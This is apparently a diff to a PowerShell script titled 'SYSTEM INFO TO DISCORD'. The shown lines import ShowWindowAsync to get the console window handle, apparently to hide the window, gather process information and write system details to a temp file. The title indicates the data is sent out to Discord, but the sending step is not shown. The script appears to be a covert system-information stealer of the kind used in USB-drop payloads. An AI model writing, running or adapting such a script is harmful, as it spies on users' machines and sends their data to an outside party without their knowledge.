@@ -1,3 +1,5 @@
+# SYSTEM INFO TO DISCORD
+
 $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
 $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
 $hwnd = (Get-Process -PID $pid).MainWindowHandle
@@ -338,6 +340,7 @@ Current Processes Information
 $process
 
 =================================================================================================================================="
+
 $outpath = "$env:TEMP/systeminfo.txt"
 $infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
 $infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
